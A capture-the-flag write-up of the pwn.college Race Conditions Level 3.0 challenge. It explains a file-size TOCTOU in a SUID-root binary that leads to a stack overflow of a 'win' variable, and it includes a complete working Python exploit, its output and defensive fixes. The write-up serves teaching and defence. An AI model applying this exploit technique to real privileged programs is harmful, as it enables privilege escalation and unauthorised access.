# Stage 22: Race Conditions Level 3.0 — TOCTOU Stack Variable Overwrite

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Race Condition |
| **Level** | 3.0 |
| **Estimated Time** | — |
| **Category** | Race Condition / TOCTOU |
| **Platform** | Linux x86-64 |
| **Binary** | `/challenge/babyrace_level3.0` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/babyrace_level3.0` is a SUID-root PIE ELF that accepts a file path. It rejects paths containing `flag`, rejects symbolic links, rejects files larger than 256 bytes, then opens the path and reads up to 4096 bytes into a 256-byte stack buffer.

The bug is a file-size TOCTOU. The size check and the read are separated by a `getchar()` pause. A 256-byte regular file passes validation, then the exploit rewrites the same path to 264 bytes before the program resumes. The extra eight bytes overflow the buffer and overwrite an adjacent variable named `win`.

The program prints `win` and calls a privileged `win()` function when it is nonzero. The exploit does not overwrite the return address or the stack canary. It only changes an application-level condition that gates the flag-printing path.

| Attribute | Details |
|-----------|---------|
| Platform | pwn.college |
| Challenge | Race Conditions Level 3.0 |
| Binary | `/challenge/babyrace_level3.0` |
| Architecture | Linux x86-64 |
| Binary format | ELF 64-bit LSB PIE |
| Privilege model | SUID root |
| Primary vulnerability | Time-of-check to time-of-use (TOCTOU) |
| Secondary vulnerability | Stack-buffer overflow |
| Exploit technique | File-size race condition |
| Corrupted variable | `win` |
| Trigger condition | `win != 0` |
| Result | Successful flag retrieval |

## Target Reconnaissance

The target was located in `/challenge`:

```bash
cd /challenge
ls -l
```

Output:

```text
babyrace_level3.0
```

### Binary identification

```bash
file ./babyrace_level3.0
```

Result:

```text
setuid ELF 64-bit LSB pie executable,
x86-64, dynamically linked, not stripped
```

Permission inspection:

```bash
ls -l ./babyrace_level3.0
```

The binary had SUID-root permissions:

```text
-rwsr-xr-x 1 root root 17704 Jan 28 2025 babyrace_level3.0
```

The `s` in the owner execute position marks the SUID bit. The executable is owned by root, so a permitted run receives root's effective UID. That is what makes the memory-corruption path security-sensitive: the `win()` function reads the protected file with elevated privileges.

## String Analysis

Run:

```bash
strings -a ./babyrace_level3.0
```

Relevant strings:

```text
You win! Here is your flag:
/flag
ERROR: Failed to open the flag -- %s!
Your effective user id is not 0!
ERROR: Failed to read the flag -- %s!
This challenge allows you to open a single file
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
This challenge will verify that the file is not larger than 256 bytes.
Calling lstat (does not follow symlinks) on the path.
Paused (press enter to continue)
Error: file is too large!
Value of "win" variable: %llx
```

The string `Value of "win" variable: %llx` was the important clue. It showed that the program kept a variable whose value influenced whether the success function ran, and that the variable was printed as a 64-bit hexadecimal value.

The pause string confirmed that the program offered interactive synchronization points, so the exploit could act between validation and use rather than relying on pure scheduling luck.

## Static Binary Analysis

Disassemble `main()`:

```bash
objdump -d -M intel --disassemble=main ./babyrace_level3.0
```

Inspect the symbols:

```bash
readelf -sW ./babyrace_level3.0 | grep -E 'main|open|read|stat|malloc|realloc|memcpy'
```

The disassembly revealed this sequence:

1. Validate the number of command-line arguments.
2. Check whether the supplied pathname contains `flag`.
3. Print the file-validation information.
4. Pause for user input.
5. Call `lstat()`.
6. Reject symbolic links.
7. Check whether the file size exceeds 256 bytes.
8. Pause again.
9. Open the file.
10. Read up to 4096 bytes into a stack buffer.
11. Print the value of `win`.
12. Call `win()` if the variable is nonzero.

The important instruction addresses were:

| Address | Operation |
|---------|-----------|
| `0x1564` | Calls `strstr()` |
| `0x15bc` | Calls `lstat()` |
| `0x15e2` | Inspects the file type |
| `0x160b` | Compares file size against `0x100` |
| `0x1635` | Second `getchar()` pause |
| `0x1655` | Calls `open()` |
| `0x1663` | Sets read size to `0x1000` |
| `0x166d` | Calls `read()` |
| `0x1679` | Prints `win` |
| `0x1698` | Calls `win()` |

The most important finding was the mismatch between the validated file size and the subsequent read length:

- The size check compares against `0x100`, or 256 bytes.
- The read is configured with `0x1000`, or 4096 bytes.
- The destination buffer is only 256 bytes.

## Root Cause: TOCTOU File-Size Validation

The original challenge source was not captured for this run. The C snippets below are a conceptual reconstruction of the relevant behavior from the disassembly, not a verified source-code copy.

The vulnerable behavior is:

```c title="level-3-0-race.c" keys="3,9,16,20"
struct stat st;

lstat(path, &st);

if (S_ISLNK(st.st_mode)) {
    exit(1);
}

if (st.st_size > 256) {
    puts("Error: file is too large!");
    exit(1);
}

getchar();

int fd = open(path, O_RDONLY);

char buffer[256];

read(fd, buffer, 4096);
```

The program checks the file's size at one moment but does not guarantee that the size remains unchanged when the file is read. The validation is not bound to the subsequent read operation.

### Normal execution

```text
File supplied
     |
     v
lstat(path)
     |
     v
File size <= 256
     |
     v
Validation succeeds
     |
     v
open(path)
     |
     v
read()
     |
     v
Buffer receives file contents
```

### Exploitation execution

```text
Create regular file (256 bytes)
     |
     v
Launch target binary
     |
     v
lstat() validates file
     |
     v
File size check passes
     |
     v
Program pauses
     |
     v
Attacker enlarges file to 264 bytes
     |
     v
Program resumes
     |
     v
open() opens modified file
     |
     v
read() requests up to 4096 bytes
     |
     v
256-byte buffer overflows
     |
     v
Adjacent win variable overwritten
     |
     v
win() executed
     |
     v
Flag retrieved
```

The pathname never changes. Only the contents and size of the regular file do.

## Stack Layout and Memory Corruption

The disassembly showed the stack-frame allocation:

```asm
sub rsp,0x1c0
```

The input buffer was addressed relative to the base pointer:

```asm
lea rax,[rbp-0x110]
```

The read was configured with:

```asm
mov edx,0x1000
call read@plt
```

The program therefore requested up to 4096 bytes while the destination buffer was only 256 bytes.

The adjacent `win` variable was accessed at:

```asm
mov rax,QWORD PTR [rbp-0x10]
```

The stack layout was:

```text
Higher memory addresses
+-----------------------------+
| Stack canary                |
| rbp - 0x8                   |
+-----------------------------+
| win variable (8 bytes)      |
| rbp - 0x10                  |
+-----------------------------+
|                             |
| Input buffer                |
| 256 bytes                   |
|                             |
| rbp - 0x110                 |
+-----------------------------+
Lower memory addresses
```

The distance from the start of the input buffer to the start of `win` is:

```text
0x110 - 0x10 = 0x100
```

In decimal:

```text
256 bytes
```

Therefore:

- Bytes 0–255 fill the input buffer.
- Bytes 256–263 overwrite the eight-byte `win` variable.
- Bytes beyond that would continue toward other stack data, including the canary.

The exploit did not need to overwrite the return address or modify the stack canary. It only needed to make `win` nonzero.

## Exploitation Strategy

The exploit used a regular file and the program's two synchronization points.

The initial file was created with exactly 256 bytes:

```python
with open(TARGET, "wb") as f:
    f.write(b"A" * 256)
```

That mattered because the program rejected files larger than 256 bytes.

The binary was launched through a pseudo-terminal:

```python
pid, fd = pty.fork()
```

The pseudo-terminal let the exploit read the program's output and interact with its `getchar()` pauses.

### First synchronization point

The program printed:

```text
Paused (press enter to continue)
```

The exploit sent:

```python
os.write(fd, b"\n")
```

This allowed execution to continue into the `lstat()` and validation operations.

### Second synchronization point

After the metadata checks, the program paused again. At this point the regular file had passed:

- Pathname validation.
- Symbolic-link validation.
- File-size validation.

The exploit then modified the existing file.

### File enlargement

The payload was:

```python
payload = b"A" * 256 + b"WINWIN!!"
```

Its total length was:

```text
256 + 8 = 264 bytes
```

The file was rewritten:

```python
with open(TARGET, "wb") as f:
    f.write(payload)
    f.flush()
    os.fsync(f.fileno())
```

The pathname and the underlying regular file stayed the same. Only the contents and size changed.

The program was then allowed to continue.

## Complete Proof of Concept

The following is the complete working exploit used in the challenge.

```python title="exploit30.py" keys="19,47,50,64,79,81,84,89"
#!/usr/bin/env python3

import os
import pty
import select
import sys
import time

BINARY = "/challenge/babyrace_level3.0"
TARGET = "/home/hacker/race/racefile"

os.makedirs("/home/hacker/race", exist_ok=True)

# Initial file: exactly 256 bytes.
with open(TARGET, "wb") as f:
    f.write(b"A" * 256)


def read_until(fd, marker, timeout=10):
    output = b""
    deadline = time.time() + timeout

    while time.time() < deadline:
        ready, _, _ = select.select(
            [fd], [], [], 0.2
        )

        if ready:
            try:
                data = os.read(fd, 4096)
            except OSError:
                break

            if not data:
                break

            output += data

            if marker in output:
                return output

    raise TimeoutError(
        "Did not receive expected output: " + repr(marker)
    )


pid, fd = pty.fork()

if pid == 0:
    os.execv(BINARY, [BINARY, TARGET])

try:
    # First pause: before lstat().
    output = read_until(
        fd,
        b"Paused (press enter to continue)"
    )

    sys.stdout.write(
        output.decode(errors="replace")
    )

    print("\n[+] Passing first pause")
    os.write(fd, b"\n")

    # Second pause: validation has completed.
    output = read_until(
        fd,
        b"Paused (press enter to continue)"
    )

    sys.stdout.write(
        output.decode(errors="replace")
    )

    print("\n[+] File passed the 256-byte size check")

    # Enlarge the same regular file after validation.
    payload = b"A" * 256 + b"WINWIN!!"

    with open(TARGET, "wb") as f:
        f.write(payload)
        f.flush()
        os.fsync(f.fileno())

    print("[+] File enlarged to", len(payload), "bytes")
    print("[+] Sending second newline")

    os.write(fd, b"\n")

    # Collect challenge output.
    while True:
        ready, _, _ = select.select(
            [fd], [], [], 2
        )

        if not ready:
            break

        try:
            data = os.read(fd, 4096)
        except OSError:
            break

        if not data:
            break

        sys.stdout.write(
            data.decode(errors="replace")
        )

        sys.stdout.flush()

finally:
    try:
        os.close(fd)
    except OSError:
        pass

    try:
        os.kill(pid, 9)
    except ProcessLookupError:
        pass

    try:
        os.waitpid(pid, 0)
    except ChildProcessError:
        pass
```

### Execute

```bash
python3 /tmp/exploit30.py
```

## Successful Exploitation Output

The exploit passed both synchronization points. The observed output was:

```text
###
### Welcome to /challenge/babyrace_level3.0!
###

Through this series of challenges, you will become familiar with the concept of race conditions.

Calling lstat (does not follow symlinks) on the path.

Paused (press enter to continue)

[+] Passing first pause

Paused (press enter to continue)

[+] File passed the 256-byte size check
[+] File enlarged to 264 bytes
[+] Sending second newline

Value of "win" variable: 21214e49574e4957
You win! Here is your flag:

pwn.college{...}

### Goodbye!
```

The program reported:

```text
Value of "win" variable: 21214e49574e4957
```

That confirmed the adjacent variable had been overwritten. The `win()` function then ran and printed the protected flag. The live flag value is redacted on this page; the rest of the observed output is preserved.

## Understanding the Overwritten Value

The eight-byte payload was:

```text
WINWIN!!
```

Its hexadecimal byte representation was:

```text
57 49 4e 57 49 4e 21 21
```

On x86-64, memory is interpreted in little-endian byte order. The first byte becomes the least significant byte of the integer:

```text
0x21214e49574e4957
```

This matches the program's output:

```text
21214e49574e4957
```

The value was nonzero, satisfying the condition that triggered the success function. The relevant disassembly was:

```asm
168a: mov rax,QWORD PTR [rbp-0x10]
168e: test rax,rax
1691: je 169d
1698: call 1329 <win>
```

In other words:

```c
if (win != 0) {
    win();
}
```

The exploit changed the data used by this conditional branch without overwriting the instruction pointer.

## Why the Exploit Worked

The exploit combined three separate weaknesses.

### A. TOCTOU vulnerability

The file-size check happened before the actual file read. The program did not ensure that the file's size stayed unchanged.

### B. Unbounded read relative to the buffer

The destination buffer was 256 bytes, but the program requested up to 4096 bytes. That created a stack-buffer overflow.

### C. Security-sensitive adjacent variable

The `win` variable was located immediately after the input buffer. Overwriting it changed the program's execution behavior.

The complete chain was:

```text
Filesystem race
      |
      v
Bypass file-size validation
      |
      v
Oversized read
      |
      v
Stack-buffer overflow
      |
      v
Overwrite win variable
      |
      v
Conditional branch succeeds
      |
      v
Privileged win() function
      |
      v
Protected flag disclosure
```

## Why This Was Not a Traditional Return-Address Overwrite

A traditional stack-based control-flow exploit might overwrite:

- The saved frame pointer.
- The return address.
- Function pointers.
- Other control-flow data.

This exploit used a different primitive. The return address was not the target. Instead, the exploit modified an application-level variable that controlled whether a privileged function would execute.

That matters because memory corruption does not always require direct instruction-pointer control. An attacker may achieve the intended behavior by modifying:

- Boolean authorization flags.
- Privilege indicators.
- State variables.
- Function pointers.
- Length fields.
- Object metadata.
- Application-specific security conditions.

The security impact depends on how the corrupted data is used afterward.

## Defensive Mitigations

The vulnerability can be prevented with several secure programming practices.

### 1. Validate the opened file descriptor

Instead of checking a pathname and later reopening it, open the file first and inspect the resulting descriptor with `fstat()`. This ensures that the metadata validation applies to the object being read.

### 2. Enforce the actual read limit

The program should never read more bytes than the destination buffer can safely hold:

```c
ssize_t n = read(fd, buffer, sizeof(buffer));
```

### 3. Avoid assumptions about file size

File metadata can change. A previously valid size is not a guarantee about how many bytes can subsequently be read.

### 4. Use safe file-opening and resolution practices

Use appropriate pathname-resolution restrictions and avoid reopening attacker-controlled paths unnecessarily.

### 5. Minimize SUID usage

Privileged executables should expose the smallest possible attack surface and avoid processing untrusted files with elevated privileges.

### 6. Use compiler and runtime protections

Stack canaries, Address Space Layout Randomization, PIE, and other hardening mechanisms can reduce the impact of memory corruption. They do not replace correct bounds checking and race-free file handling.

### A safer shape

```c title="safe-read-level-3-0.c" keys="4,9,14,19"
struct stat st;
char buffer[256];

int fd = open(path, O_RDONLY | O_NOFOLLOW);

if (fd < 0)
    return -1;

if (fstat(fd, &st) < 0) {
    close(fd);
    return -1;
}

if (st.st_size > sizeof(buffer)) {
    close(fd);
    return -1;
}

ssize_t n = read(fd, buffer, sizeof(buffer));
```

`O_NOFOLLOW` rejects a final-component symlink. `fstat()` validates the descriptor that was actually opened. The read is capped at `sizeof(buffer)`, so a later file-size change cannot overflow the stack buffer.

## Exploit Development Lessons

This challenge demonstrated several important concepts:

- Static analysis of dynamically linked ELF binaries.
- Understanding x86-64 stack-frame layout.
- Identifying local variables using assembly offsets.
- Understanding `lstat()` behavior.
- Exploiting file-size TOCTOU conditions.
- Synchronizing with interactive program execution.
- Using Python pseudo-terminals for deterministic interaction.
- Modifying files between validation and use.
- Turning a filesystem race into a stack-buffer overflow.
- Targeting an application variable instead of a return address.
- Understanding little-endian memory representation.
- Analyzing conditional branches and function calls.

## Final Results

| Property | Result |
|----------|--------|
| Challenge | pwn.college Race Conditions Level 3.0 |
| Binary | `babyrace_level3.0` |
| Binary permissions | SUID root |
| Architecture | x86-64 |
| Primary vulnerability | TOCTOU |
| Secondary vulnerability | Stack-buffer overflow |
| Validation function | `lstat()` |
| File-opening function | `open()` |
| Read function | `read()` |
| Validated maximum size | 256 bytes |
| Actual read limit | 4096 bytes |
| Input file size after race | 264 bytes |
| Overflow length | 8 bytes |
| Corrupted variable | `win` |
| Trigger condition | `win != 0` |
| Exploit language | Python 3 |
| Result | Successful |

## Conclusion

Level 3.0 demonstrates how a simple file-size validation can become a serious memory-corruption vulnerability when the validated resource is modified before use.

The exploit did not rely on a symbolic-link bypass, a return-address overwrite, or shellcode execution. Instead, it used a controlled file-size race to exceed a stack buffer's capacity and overwrite an adjacent variable that directly influenced program execution.

The most important lesson is that filesystem validation and memory safety cannot be treated as separate concerns. A race condition can invalidate an earlier security check, and an unsafe operation performed afterward can turn that race into a reliable memory-corruption primitive.
